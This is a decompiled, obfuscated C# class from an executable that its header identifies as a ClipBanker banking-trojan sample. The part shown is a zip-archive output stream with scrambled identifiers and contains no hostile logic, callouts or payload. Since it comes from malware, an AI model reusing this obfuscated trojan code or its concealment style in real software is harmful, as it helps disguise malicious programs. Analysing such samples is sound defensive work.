// Decompiled with JetBrains decompiler
// Type: Bv9.4M6
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u0032L6;
using \u003312;
using \u0034i2;
using \u0038Gu;
using B15;
using g5V;
using KtU;
using Qlv;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using t28;

namespace Bv9
{
  internal sealed class \u0034M6 : Stream
  {
    private int idR;
    private YNv TM4;
    internal string Wc6;
    private string \u003361;
    private Stream \u0031X1;
    private q14 Re4;
    internal \u0033RZ TIk;
    private Dictionary<string, q14> e6F;
    private int \u003976;
    private VR4 \u0032G1;
    private Encoding \u003167;
    private bool \u003134;
    private bool G9L;
    private bool CJ8;
    private bool \u003752;
    private bool aI3;
    private \u0036IA J78;
    private Stream hq3;
    private Stream FKF;
    private \u0039c4 \u00377W;
    private bool yba;
    private string \u0035d5;
    internal A8K \u003732;
    private long XLE;
    private int t72;

    string object.\u0038W2() => string.Format("ZipOutputStream::{0}(leaveOpen({1})))", (object) this.\u0035d5, (object) this.\u003134);

    [SpecialName]
    public int \u00386k() => this.idR;

    [SpecialName]
    public YNv \u0036Vf() => this.TM4;

    [SpecialName]
    public string V27() => this.\u003361;

    [SpecialName]
    public \u0033RZ \u0031X9() => this.TIk;

    [SpecialName]
    public Encoding \u003691() => this.\u003167;

    [SpecialName]
    public VR4 \u003258() => this.\u0032G1;

    [SpecialName]
    public static Encoding LV5() => Encoding.GetEncoding("IBM437");

    [SpecialName]
    public long \u003125() => this.XLE;

    [SpecialName]
    public int QNr() => this.t72;

    [SpecialName]
    internal Stream \u0033uJ() => this.\u0031X1;

    void Stream.P2Z([In] byte[] obj0, [In] int obj1, [In] int obj2)
    {
      if (this.G9L)
      {
        this.CJ8 = true;
        throw new InvalidOperationException("The stream has been closed.");
      }
      if (obj0 == null)
      {
        this.CJ8 = true;
        throw new ArgumentNullException("buffer");
      }
      if (this.Re4 == null)
      {
        this.CJ8 = true;
        throw new InvalidOperationException("You must call PutNextEntry() before calling Write().");
      }
      if (this.Re4.pT8)
      {
        this.CJ8 = true;
        throw new InvalidOperationException("You cannot Write() data for an entry that is a directory.");
      }
      if (this.yba)
        this.CL3(false);
      if (obj2 == 0)
        return;
      ((Stream) this.\u00377W).Write(obj0, obj1, obj2);
    }

    private void CL3([In] bool obj0)
    {
      this.e6F.Add(this.Re4.L83, this.Re4);
      ++this.\u003976;
      if (this.\u003976 > 65534 && this.TIk == \u0033RZ.\u0023a)
      {
        this.CJ8 = true;
        throw new InvalidOperationException("Too many entries. Consider setting ZipOutputStream.EnableZip64.");
      }
      this.Re4.Y63(this.\u0031X1, obj0 ? 99 : 0);
      this.Re4.\u00349w();
      if (!this.Re4.pT8)
      {
        this.Re4.\u0032O3(this.\u0031X1);
        this.Re4.De6(this.\u0031X1, obj0 ? 0L : -1L, out this.J78, out this.hq3, out this.FKF, out this.\u00377W);
      }
      this.yba = false;
    }

    private void W7D()
    {
      if (this.Re4 == null)
        return;
      if (this.yba)
        this.CL3(true);
      this.Re4.TI6(this.\u0031X1, this.J78, this.hq3, this.FKF, this.\u00377W);
      this.Re4.R25(this.\u0031X1);
      bool? nullable = this.Re4.\u003551;
      if (nullable.HasValue)
      {
        int num1 = this.\u003752 ? 1 : 0;
        nullable = this.Re4.\u003551;
        int num2 = nullable.Value ? 1 : 0;
        this.\u003752 = (num1 | num2) != 0;
      }
      this.J78 = (\u0036IA) null;
      this.hq3 = this.FKF = (Stream) null;
      this.\u00377W = (\u0039c4) null;
    }

    void Stream.bcE([In] bool obj0)
    {
      if (this.G9L)
        return;
      if (obj0 && !this.CJ8)
      {
        this.W7D();
        this.aI3 = \u003324.ZB7(this.\u0031X1, (ICollection<q14>) this.e6F.Values, 1U, this.TIk, this.V27(), new \u0033rn((object) this));
        Stream stream;
        if (this.\u0031X1 is \u0036IA obj)
        {
          stream = obj.rZ5();
          obj.Dispose();
        }
        else
          stream = this.\u0031X1;
        if (!this.\u003134)
          stream.Dispose();
        this.\u0031X1 = (Stream) null;
      }
      this.G9L = true;
    }

    [SpecialName]
    bool Stream.F6h() => false;

    [SpecialName]
    bool Stream.k91() => false;

    [SpecialName]
    bool Stream.A9N() => true;

    [SpecialName]
    long Stream.llc() => throw new NotSupportedException();

    [SpecialName]
    long Stream.\u00342C() => this.\u0031X1.Position;

    [SpecialName]
    void Stream.d15([In] long obj0) => throw new NotSupportedException();

    void Stream.\u003331()
    {
    }

    int Stream.em2([In] byte[] obj0, [In] int obj1, [In] int obj2) => throw new NotSupportedException("Read");

    long Stream.DA6([In] long obj0, [In] SeekOrigin obj1) => throw new NotSupportedException("Seek");

    void Stream.\u0037dy([In] long obj0) => throw new NotSupportedException();
  }
}
